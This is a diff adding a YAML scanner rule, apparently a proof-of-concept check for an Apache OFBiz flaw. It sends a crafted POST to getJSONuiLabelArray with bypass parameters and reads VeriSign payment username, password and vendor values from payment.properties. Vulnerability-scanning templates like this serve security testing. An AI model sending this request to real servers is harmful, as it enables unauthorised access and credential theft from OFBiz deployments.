@@ -1,0 +1,16 @@
+name: Apache-OFBiz-SSRF
+description: "读取配置文件"
+matchCount: 1
+rules:
+  - method: POST
+    path: /webtools/control/getJSONuiLabelArray/?USERNAME=&PASSWORD=s&requirePasswordChange=Y
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: > 
+      requiredLabels={"file:applications/accounting/config/payment.properties":["payment.verisign.user","payment.verisign.pwd","payment.verisign.vendor"]}
+    expression:
+      status: 200
+      headers:
+        Content-Type: application/json
+      body_all:
+        - "payment.properties" 
